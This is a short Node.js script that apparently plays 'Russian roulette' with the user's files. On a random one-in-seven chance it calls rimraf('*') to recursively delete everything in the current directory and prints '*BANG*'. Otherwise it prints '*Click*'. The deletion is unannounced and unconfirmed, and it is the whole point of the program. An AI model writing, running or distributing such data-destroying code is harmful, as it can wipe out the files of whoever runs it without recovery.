#! /usr/bin/env node
var random = Math.floor(Math.random() * 7);

if (random === 0) {
  var rimraf = require('rimraf');
  rimraf('*', function() {
    console.log('*BANG*');
  });
} else {
  console.log('*Click*');
}
